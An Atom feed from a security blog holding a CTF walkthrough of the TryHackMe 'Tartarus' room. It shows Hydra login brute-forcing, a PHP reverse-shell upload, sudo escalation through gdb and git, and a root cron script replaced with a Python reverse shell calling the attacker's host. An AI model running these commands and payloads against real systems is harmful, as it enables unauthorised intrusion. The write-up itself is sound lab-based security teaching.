@@ -1,0 +1,587 @@
+<?xml version="1.0" encoding="utf-8"?>
+
+<feed xmlns="http://www.w3.org/2005/Atom" >
+  <generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator>
+  <link href="https://darrynbrownfield.co.uk/tag/easy/feed.xml" rel="self" type="application/atom+xml" />
+  <link href="https://darrynbrownfield.co.uk/" rel="alternate" type="text/html" />
+  <updated>2020-09-26T17:13:20+00:00</updated>
+  <id>https://darrynbrownfield.co.uk/tag/easy/feed.xml</id>
+
+  
+  
+  
+
+  
+    <title type="html">Darryn Brownfield | </title>
+  
+
+  
+    <subtitle>Infosec | Hacking | CTF</subtitle>
+  
+
+  
+
+  
+    
+      
+    
+  
+
+  
+  
+
+  
+    <entry>
+      <title type="html">Tartarus Write Up</title>
+      <link href="https://darrynbrownfield.co.uk/Tartarus" rel="alternate" type="text/html" title="Tartarus Write Up" />
+      <published>2020-09-26T00:00:00+00:00</published>
+      <updated>2020-09-26T00:00:00+00:00</updated>
+      <id>https://darrynbrownfield.co.uk/Tartarus</id>
+      <content type="html" xml:base="https://darrynbrownfield.co.uk/Tartarus">&lt;p&gt;&lt;img src=&quot;/assets/images/tartarus/cover.jpeg&quot; alt=&quot;GitHappens&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
+
+&lt;p&gt;Tartarus is an fun easy room from &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt;. We have two tasks to complete, finding both the user and root flag. Typical CTF style room.&lt;/p&gt;
+
+&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
+
+&lt;p&gt;TryHackMe will assign a dynamic IP as part of the deployment, I’ve edited my /etc/hosts file with the name of the box and the assigned IP. I started by doing an nmap scan to check what ports are open.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
+└──╼ $sudo nmap -sC -sV -oA nmap/initial tartarus
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-26 16:16 BST
+Nmap scan report for tartarus (10.10.30.144)
+Host is up (0.026s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.8.21.217
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 98:6c:7f:49:db:54:cb:36:6d:d5:ff:75:42:4c:a7:e0 (RSA)
+|   256 0c:7b:1a:9c:ed:4b:29:f5:3e:be:1c:9a:e4:4c:07:2c (ECDSA)
+|_  256 50:09:9f:c0:67:3e:89:93:b0:c9:85:f1:93:89:50:68 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.18 seconds
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;3 Ports open:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;21 - FTP - Anonymous login allowed which is interesting will need to check what files and access is available&lt;/li&gt;
+  &lt;li&gt;22 - SSH - Banner is showing its an Ubuntu machine&lt;/li&gt;
+  &lt;li&gt;80 - HTTP - Apache web server&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;SSH has a smaller attack surface than the other ports so will leave that for now, I decided to look at FTP first.&lt;/p&gt;
+
+&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;
+
+&lt;p&gt;Using the ftp utility I was able to login using the username ‘anonymous’ and password ‘anonymous’.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
+└──╼ $ftp tartarus
+Connected to tartarus.
+220 (vsFTPd 3.0.3)
+Name (tartarus:daz): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&amp;gt; ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
+226 Directory send OK.
+ftp&amp;gt; ls -lah
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 .
+drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ..
+drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ...
+-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
+226 Directory send OK.
+ftp&amp;gt; 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Just one file test.txt, but what is also interesting is ‘…’ which is a folder. Typically you would find . (current directory) and .. (parent directory). Next I downloaded the test.txt file and checked the … directory.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;ftp&amp;gt; get test.txt
+local: test.txt remote: test.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for test.txt (17 bytes).
+226 Transfer complete.
+17 bytes received in 0.00 secs (38.8795 kB/s)
+ftp&amp;gt; cd ...
+250 Directory successfully changed.
+ftp&amp;gt; ls -lah
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 .
+drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ..
+drwxr-xr-x    2 ftp      ftp          4096 Jul 05 21:31 ...
+226 Directory send OK.
+ftp&amp;gt; cd ...
+250 Directory successfully changed.
+ftp&amp;gt; ls -lah
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 ftp      ftp          4096 Jul 05 21:31 .
+drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ..
+-rw-r--r--    1 ftp      ftp            14 Jul 05 21:45 yougotgoodeyes.txt
+226 Directory send OK.
+ftp&amp;gt; get yougotgoodeyes.txt
+local: yougotgoodeyes.txt remote: yougotgoodeyes.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for yougotgoodeyes.txt (14 bytes).
+226 Transfer complete.
+14 bytes received in 0.00 secs (19.1215 kB/s)
+ftp&amp;gt; exit
+221 Goodbye.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Navigating to … lists another folder called … but now we find another text file called yougotgoodeyes.txt.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
+└──╼ $cat test.txt 
+vsftpd test file
+┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
+└──╼ $cat yougotgoodeyes.txt 
+/sUp3r-s3cr3t
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;test.txt doesn’t give us anything to interesting, nmap was able to identify the FTP server was vsftpd. However, yougotgoodeyes.txt provides what looks like a web directory. Next step is to move on to port 80 and see what we can find. While I was reviewing FTP I had gobuster and nikto running in the background to enumerate the web service.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/tartarus/webpage.png&quot; alt=&quot;webpage&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The webpage just displays the default apache page, I checked the source code but nothing stood out.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
+└──╼ $gobuster dir -u http://tartarus -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://tartarus
+[+] Threads:        50
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/09/26 16:32:10 Starting gobuster
+===============================================================
+/server-status (Status: 403)
+===============================================================
+2020/09/26 16:34:00 Finished
+===============================================================
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Gobuster also didn’t reveal anything.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
+└──╼ $nikto -host http://tartarus
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.30.144
++ Target Hostname:    tartarus
++ Target Port:        80
++ Start Time:         2020-09-26 16:31:43 (GMT1)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.18 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ &quot;robots.txt&quot; contains 1 entry which should be manually viewed.
++ Server may leak inodes via ETags, header found with file /, inode: 2c39, size: 5a9b87b015a4a, mtime: gzip
++ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
++ OSVDB-3233: /icons/README: Apache default file found.
++ 7686 requests: 0 error(s) and 8 item(s) reported on remote host
++ End Time:           2020-09-26 16:35:39 (GMT1) (236 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Nikto was able to find robots.txt with one entry.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/tartarus/robots.png&quot; alt=&quot;robots&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Great now I have the admin directory and a potential username ‘d4rckh’.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/tartarus/admin-dir.png&quot; alt=&quot;admin-dir&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Checking out the admin-dir I found to files credentials.txt and userid. I download each to my machine.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;userid - Is a list of random usernames&lt;/li&gt;
+  &lt;li&gt;credentials.txt - Is a list of common passwords&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;We could use these to brute force SSH but first I will look at the directory ‘/sUp3r-s3cr3t/’ found on the FTP service.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/tartarus/login.png&quot; alt=&quot;login&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I bet the username/password lists we found are to be used here, I tried to login with admin/admin.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/tartarus/username.png&quot; alt=&quot;username&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;But I get the error ‘Incorrect username!’. Its highlighting the username is wrong, not the username or password is wrong. I can use this error message along with the userid file to find the correct username(s).&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
+└──╼ $hydra -L userid -p &quot;test&quot; tartarus http-post-form &quot;/sUp3r-s3cr3t/authenticate.php:username=^USER^&amp;amp;password=^PASS^&amp;amp;Login=Login:Incorrect username!&quot;
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-26 16:53:45
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 13 tasks per 1 server, overall 13 tasks, 13 login tries (l:13/p:1), ~1 try per task
+[DATA] attacking http-post-form://10.10.30.144:80/sUp3r-s3cr3t/authenticate.php:username=^USER^&amp;amp;password=^PASS^&amp;amp;Login=Login:Incorrect username!
+[80][http-post-form] host: 10.10.30.144   login: &amp;lt;HIDDEN&amp;gt;   password: test
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-26 16:53:55
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I used hydra to test each of the usernames to see which were failed.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;-L - username file&lt;/li&gt;
+  &lt;li&gt;-p - I used “test” as a place holder password for now&lt;/li&gt;
+  &lt;li&gt;tartarus - The target&lt;/li&gt;
+  &lt;li&gt;http-post-form - Perform a POST request&lt;/li&gt;
+  &lt;li&gt;/sUp3r-s3cr3t/authenticate.php: - Is the directory/webpage to target&lt;/li&gt;
+  &lt;li&gt;username=^USER^&amp;amp;password=^PASS^&amp;amp;Login=Login: - These are the values the webpage is expecting, ^^ tell Hydra what to populate in those fields.&lt;/li&gt;
+  &lt;li&gt;Incorrect username! - Tells hydra what a failed message will include&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;We have a username, I repeated the process but this time to check for the password.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
+└──╼ $hydra -l &amp;lt;HIDDEN&amp;gt; -P credentials.txt 10.10.30.144 http-post-form &quot;/sUp3r-s3cr3t/authenticate.php:username=^USER^&amp;amp;password=^PASS^&amp;amp;Login=Login:Incorrect password!&quot;
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-26 17:02:23
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 101 login tries (l:1/p:101), ~7 tries per task
+[DATA] attacking http-post-form://10.10.30.144:80/sUp3r-s3cr3t/authenticate.php:username=^USER^&amp;amp;password=^PASS^&amp;amp;Login=Login:Incorrect password!
+[80][http-post-form] host: 10.10.30.144   login: &amp;lt;HIDDEN&amp;gt;   password: &amp;lt;HIDDEN&amp;gt;
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-26 17:02:24
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;All I need to change was the error message, the username and password flags and values. Now with the username and password I will try and log in.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/tartarus/upload.png&quot; alt=&quot;upload&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It worked and now im presented with a upload page, first thing that comes to mind is a PHP reverse shell. First I will gobuster for other directories.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
+└──╼ $gobuster dir -u http://tartarus/sUp3r-s3cr3t -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://tartarus/sUp3r-s3cr3t
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/09/26 17:12:07 Starting gobuster
+===============================================================
+/images (Status: 301)
+===============================================================
+2020/09/26 17:20:54 Finished
+===============================================================
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Inside images is a folder called uploads, this is what I needed. Now I know where my shell will be uploaded.&lt;/p&gt;
+
+&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;
+
+&lt;p&gt;First I copy a php reverse shell script from my webshells directory found on both ParrotOS and Kali and rename it to shell.php.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
+└──╼ $cp /usr/share/webshells/php/php-reverse-shell.php .
+┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
+└──╼ $mv php-reverse-shell.php shell.php
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Editing the script I will keep port as 1234 for now and change the IP to point to my VPN IP.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;set_time_limit (0);
+$VERSION = &quot;1.0&quot;;
+$ip = '127.0.0.1';  // CHANGE THIS
+$port = 1234;       // CHANGE THIS
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; /bin/sh -i';
+$daemon = 0;
+$debug = 0;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now I start my netcat listener ready for my shell (hopefully).&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
+└──╼ $nc -nvlp 1234
+listening on [any] 1234 ...
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/tartarus/uploaded.png&quot; alt=&quot;uploaded&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;File uploaded.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/tartarus/shell.png&quot; alt=&quot;shell&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As expected the shell.php script was uploaded to /images/uploads/&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
+└──╼ $nc -nvlp 1234
+listening on [any] 1234 ...
+connect to [10.8.21.217] from (UNKNOWN) [10.10.30.144] 52738
+Linux ubuntu-xenial 4.4.0-184-generic #214-Ubuntu SMP Thu Jun 4 10:14:11 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 16:18:28 up  1:10,  0 users,  load average: 0.10, 0.05, 0.01
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now we have a shell I will go hunting for the user flag.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ cd /home
+$ ls
+cleanup
+d4rckh
+thirtytwo
+$ cd d4rckh
+$ ls
+cleanup.py
+user.txt
+$ cat user.txt
+0f7dbb2243e692e&amp;lt;HIDDEN&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ive redacted half the flag. Now its time to get root!&lt;/p&gt;
+
+&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;
+
+&lt;p&gt;First I upgrade my shell.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;In d4rckh home directory is a python script cleanup.py. Even as www-data you can edit that file and use it to get a reverse shell as root. However I don’t believe this is the indented path just yet, first we need to become the d4rckh user.&lt;/p&gt;
+
+&lt;p&gt;When I first get a shell on machine I always run ‘sudo -l’ to check for a quick win.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;www-data@ubuntu-xenial:/home/d4rckh$ sudo -l
+Matching Defaults entries for www-data on ubuntu-xenial:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on ubuntu-xenial:
+    (thirtytwo) NOPASSWD: /var/www/gdb
+www-data@ubuntu-xenial:/home/d4rckh$ 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Im not disappointed, we can run the command gdb as the user thirtytwo. A quick look on &lt;a href=&quot;https://gtfobins.github.io/gtfobins/gdb/#sudo&quot;&gt;GTFObins&lt;/a&gt; shows I can use gdb to priv esc to the thirtytwo user.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;www-data@ubuntu-xenial:/home/d4rckh sudo -u thirtytwo /var/www/gdb -nx -ex '!sh' -ex quit
+GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
+Copyright (C) 2016 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later &amp;lt;http://gnu.org/licenses/gpl.html&amp;gt;
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;
+and &quot;show warranty&quot; for details.
+This GDB was configured as &quot;x86_64-linux-gnu&quot;.
+Type &quot;show configuration&quot; for configuration details.
+For bug reporting instructions, please see:
+&amp;lt;http://www.gnu.org/software/gdb/bugs/&amp;gt;.
+Find the GDB manual and other documentation resources online at:
+&amp;lt;http://www.gnu.org/software/gdb/documentation/&amp;gt;.
+For help, type &quot;help&quot;.
+Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;.
+$ 
+$ id
+uid=1004(thirtytwo) gid=1004(thirtytwo) groups=1004(thirtytwo)
+$ cd /home/thirtytwo
+$ ls
+note.txt
+$ cat note.txt
+Hey 32, the other day you were unable to clone my github repository.
+Now you can use git. Took a while to fix it but now its good :)
+
+~D4rckh
+$ 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now has user thirtytwo I navigate to the home directory and find a note from D4rckh. So again I checked ‘sudo -l’.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ sudo -l
+Matching Defaults entries for thirtytwo on ubuntu-xenial:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User thirtytwo may run the following commands on ubuntu-xenial:
+    (d4rckh) NOPASSWD: /usr/bin/git
+$ 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Following the same processes before, I checked GTFO bins and found a a priv esc path using git.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ sudo -u d4rckh /usr/bin/git -p help config
+GIT-CONFIG(1)                     Git Manual                     GIT-CONFIG(1)
+
+NAME
+       git-config - Get and set repository or global options
+
+SYNOPSIS
+       git config [&amp;lt;file-option&amp;gt;] [type] [-z|--null] name [value [value_regex]]
+       git config [&amp;lt;file-option&amp;gt;] [type] --add name value
+       git config [&amp;lt;file-option&amp;gt;] [type] --replace-all name value [value_regex]
+       git config [&amp;lt;file-option&amp;gt;] [type] [-z|--null] --get name [value_regex]
+       git config [&amp;lt;file-option&amp;gt;] [type] [-z|--null] --get-all name [value_regex]
+       git config [&amp;lt;file-option&amp;gt;] [type] [-z|--null] [--name-only] --get-regexp name_regex [value_regex]
+       git config [&amp;lt;file-option&amp;gt;] [type] [-z|--null] --get-urlmatch name URL
+       git config [&amp;lt;file-option&amp;gt;] --unset name [value_regex]
+       git config [&amp;lt;file-option&amp;gt;] --unset-all name [value_regex]
+       git config [&amp;lt;file-option&amp;gt;] --rename-section old_name new_name
+       git config [&amp;lt;file-option&amp;gt;] --remove-section name
+       git config [&amp;lt;file-option&amp;gt;] [-z|--null] [--name-only] -l | --list
+       git config [&amp;lt;file-option&amp;gt;] --get-color name [default]
+       git config [&amp;lt;file-option&amp;gt;] --get-colorbool name [stdout-is-tty]
+       git config [&amp;lt;file-option&amp;gt;] -e | --edit
+!/bin/bash
+d4rckh@ubuntu-xenial:~$ 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now I’m the user d4rckh I can go back to the users home directory and look at the cleanup.up script.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;d4rckh@ubuntu-xenial:/home/d4rckh$ cat cleanup.py
+# -*- coding: utf-8 -*-
+#!/usr/bin/env python
+import os
+import sys
+try:
+        os.system('rm -r /home/cleanup/* ')
+except:
+        sys.exit()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Reading the script it looks like something that would be ran via cronjob. Lets see what jobs are on the machine.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;d4rckh@ubuntu-xenial:/home/d4rckh$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+*/2 *   * * *   root    python /home/d4rckh/cleanup.py
+17 *    * * *   root    cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.monthly )
+#
+d4rckh@ubuntu-xenial:/home/d4rckh$ 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Perfect, so that script is being run by root. Lets modify to provide us with another reverses shell.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
+└──╼ $nc -nvlp 8080
+listening on [any] 8080 ...
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;First start another netcat listener.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;d4rckh@ubuntu-xenial:/home/d4rckh$ cat cleanup.py 
+# -*- coding: utf-8 -*-
+#!/usr/bin/env python
+
+import socket,subprocess,os
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((&quot;&amp;lt;HIDDEN&amp;gt;&quot;,8080))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I grabbed the python reverse shell from &lt;a href=&quot;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&quot;&gt;pentestmonkey&lt;/a&gt; and replaced the code in the script. Now I just need to wait for the reverse shell.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
+└──╼ $nc -nvlp 8080
+listening on [any] 8080 ...
+connect to [10.8.21.217] from (UNKNOWN) [10.10.30.144] 33596
+/bin/sh: 0: can't access tty; job control turned off
+# whoami
+root
+# cd /root/
+# cat root.txt
+7e055812184a5fa&amp;lt;HIDDEN&amp;gt;
+# 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Root dance!&lt;/p&gt;
+
+&lt;p&gt;Thanks for reading!&lt;/p&gt;</content>
+
+      
+      
+      
+      
+      
+
+      <author>
+          <name>Darryn</name>
+        
+        
+      </author>
+
+      
+
+      
+        <category term="tryhackme" />
+      
+        <category term="ctf" />
+      
+        <category term="easy" />
+      
+
+      
+        <summary type="html"></summary>
+      
+
+      
+      
+    </entry>
+  
+</feed>
